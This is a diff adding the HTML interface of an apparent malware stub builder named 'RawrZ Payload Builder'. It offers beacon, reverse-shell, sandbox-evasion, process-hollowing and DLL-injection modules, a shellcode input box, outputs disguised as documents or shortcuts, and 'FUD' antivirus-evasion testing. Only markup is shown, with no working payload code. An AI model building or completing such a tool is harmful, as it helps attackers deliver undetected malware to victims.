@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>RawrZ Payload Builder</title>
+  <link rel="stylesheet" href="./styles.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar">
+      <h2>Payload Modules</h2>
+      <div id="moduleToggles">
+        <div class="module-group">
+          <h4>Core Modules</h4>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="beacon" checked>
+            <span>Beacon</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="antiAnalysis" checked>
+            <span>Anti-Analysis</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="evKiller">
+            <span>EV Killer</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="redShell">
+            <span>Red Shell</span>
+          </label>
+        </div>
+        <div class="module-group">
+          <h4>Evasion</h4>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="sleepEvasion">
+            <span>Sleep Evasion</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="vmDetection">
+            <span>VM Detection</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="debuggerDetection">
+            <span>Debugger Detection</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="sandboxDetection">
+            <span>Sandbox Detection</span>
+          </label>
+        </div>
+        <div class="module-group">
+          <h4>Advanced</h4>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="processHollowing">
+            <span>Process Hollowing</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="dllInjection">
+            <span>DLL Injection</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="reflectiveLoading">
+            <span>Reflective Loading</span>
+          </label>
+          <label class="checkbox-label">
+            <input type="checkbox" class="module-checkbox" data-module="codeObfuscation">
+            <span>Code Obfuscation</span>
+          </label>
+        </div>
+      </div>
+      <hr/>
+      <div class="module-stats">
+        <div>Active: <span id="module-count">2</span></div>
+        <div>Total: <span id="totalModules">12</span></div>
+      </div>
+      <div id="enabled-modules-list">
+        <div class="enabled-module">Beacon</div>
+        <div class="enabled-module">Anti-Analysis</div>
+      </div>
+      <div class="info">
+        Select payload modules for stub generation. Advanced evasion techniques available.
+      </div>
+    </aside>
+
+    <main class="content">
+      <section class="card">
+        <h3>Payload Configuration</h3>
+        <div class="col">
+          <div class="row">
+            <select id="language-select">
+              <option value="cpp">C++</option>
+              <option value="c">C</option>
+              <option value="csharp">C#</option>
+              <option value="java">Java</option>
+              <option value="python">Python</option>
+              <option value="javascript">JavaScript</option>
+              <option value="powershell">PowerShell</option>
+              <option value="go">Go</option>
+              <option value="rust">Rust</option>
+            </select>
+            <select id="format-select">
+              <option value="exe">EXE</option>
+              <option value="dll">DLL</option>
+              <option value="ps1">PowerShell</option>
+              <option value="hta">HTA</option>
+              <option value="lnk">LNK</option>
+              <option value="doc">DOC</option>
+              <option value="pdf">PDF</option>
+            </select>
+            <select id="encryptionSelect">
+              <option value="aes256">AES-256</option>
+              <option value="chacha20">ChaCha20</option>
+              <option value="camellia">Camellia</option>
+              <option value="hybrid">Hybrid</option>
+            </select>
+          </div>
+          <div class="row">
+            <button id="btnEnableAll">Enable All Modules</button>
+            <button id="btnDisableAll">Disable All Modules</button>
+            <button id="btnResetDefault">Reset to Default</button>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>Stub Generation</h3>
+        <div class="col">
+          <div class="row">
+            <textarea id="payload-input" placeholder="Enter payload data or shellcode here..."></textarea>
+          </div>
+          <div class="row">
+            <button id="generate-stub">Generate Stub</button>
+            <button id="btnGenerateMatrix">Generate Full Matrix</button>
+            <span id="stubStatus">Ready</span>
+          </div>
+          <div class="row">
+            <label>Obfuscation Level:</label>
+            <select id="obfuscation-level">
+              <option value="low">Low</option>
+              <option value="medium">Medium</option>
+              <option value="high">High</option>
+            </select>
+            <label class="checkbox-label">
+              <input type="checkbox" id="enable-compression">
+              <span>Enable Compression</span>
+            </label>
+          </div>
+          <div id="stub-output" class="stub-output">
+            <div class="no-stub">No stub generated</div>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>File Utilities</h3>
+        <div class="row">
+          <button id="btnPickFile">Pick File</button>
+          <span id="pickedFile">No file selected</span>
+        </div>
+        <div class="row">
+          <button id="btnHash">SHA-256</button>
+          <input id="hashOut" class="mono" placeholder="Hash will appear here" readonly/>
+        </div>
+        <div class="row">
+          <button id="btnPickOutDir">Pick Output Dir</button>
+          <span id="pickedOutDir">Default: file directory</span>
+        </div>
+        <div class="row">
+          <button id="btnCompress">Compress (.gz)</button>
+          <button id="btnDecompress">Decompress (.gz)</button>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>File Encryption (AES-256-GCM)</h3>
+        <div class="col">
+          <div class="row">
+            <input id="encKeyHex" class="mono" placeholder="Optional hex key (32 bytes = 64 hex chars)"/>
+            <button id="btnEncryptFile">Encrypt File</button>
+          </div>
+          <div class="row">
+            <input id="decKeyHex" class="mono" placeholder="Hex key for decrypt"/>
+            <button id="btnDecryptFile">Decrypt File</button>
+          </div>
+          <div class="row">
+            <input id="encOutputName" placeholder="Output filename (optional)"/>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>Text Encryption Demo (AES-256-GCM)</h3>
+        <div class="col">
+          <textarea id="plainText" placeholder="Enter text to encrypt..."></textarea>
+          <div class="row">
+            <input id="keyHex" class="mono" placeholder="Optional hex key (32 bytes)"/>
+            <button id="btnEncrypt">Encrypt</button>
+          </div>
+          <textarea id="cipherHex" class="mono" placeholder="Ciphertext hex"></textarea>
+          <div class="row">
+            <input id="keyHex2" class="mono" placeholder="Hex key for decrypt"/>
+            <button id="btnDecrypt">Decrypt</button>
+          </div>
+          <textarea id="plainOut" placeholder="Decrypted text"></textarea>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>FUD Testing & Analysis</h3>
+        <div class="col">
+          <div class="row">
+            <button id="test-fud">Test FUD</button>
+            <button id="btnCheckFUD">Check FUD Status</button>
+            <span id="fudStatus">Not tested</span>
+          </div>
+          <div id="scan-progress" style="display: none;">
+            <div class="progress-bar-container">
+              <div class="progress-bar" style="width: 0%"></div>
+            </div>
+            <div class="progress-text">Scanning: 0%</div>
+          </div>
+          <div id="fud-results" class="results"></div>
+          <div id="fud-statistics" class="fud-stats">
+            <div class="stat-item">
+              <span class="stat-label">Average Detection:</span>
+              <span class="stat-value">0%</span>
+            </div>
+            <div class="stat-item">
+              <span class="stat-label">FUD Trend:</span>
+              <span class="stat-value trend-stable">stable</span>
+            </div>
+            <div class="stat-item">
+              <span class="stat-label">Total Scans:</span>
+              <span class="stat-value">0</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>Burn & Reuse Strategy</h3>
+        <div class="col">
+          <div class="row">
+            <button id="burn-stub">Burn Current Stub</button>
+            <button id="save-vault">Save to Vault</button>
+            <button id="load-vault">Load from Vault</button>
+            <span id="burnStatus">0 burned</span>
+          </div>
+          <div class="burn-queue">
+            <h4>Burn Queue:</h4>
+            <div id="burn-queue-status" class="queue-list">
+              <div class="queue-stats">
+                <div class="queue-stat">
+                  <span class="stat-number">0</span>
+                  <span class="stat-label">Active</span>
+                </div>
+                <div class="queue-stat">
+                  <span class="stat-number">0</span>
+                  <span class="stat-label">Burned</span>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="reuse-vault">
+            <h4>Reuse Vault:</h4>
+            <div id="vault-status" class="vault-list">
+              <div class="vault-stats">
+                <div class="vault-stat">
+                  <span class="stat-number">0</span>
+                  <span class="stat-label">Total</span>
+                </div>
+                <div class="vault-stat">
+                  <span class="stat-number">0</span>
+                  <span class="stat-label">High FUD</span>
+                </div>
+                <div class="vault-stat">
+                  <span class="stat-number">0%</span>
+                  <span class="stat-label">Avg FUD</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <h3>Console</h3>
+        <pre id="console"></pre>
+      </section>
+    </main>
+  </div>
+
+  <!-- Core payload building scripts -->
+  <script src="payload-builder.js"></script>
+  <script src="fud-tester.js"></script>
+  <script src="renderer-new.js"></script>
+</body>
+</html>
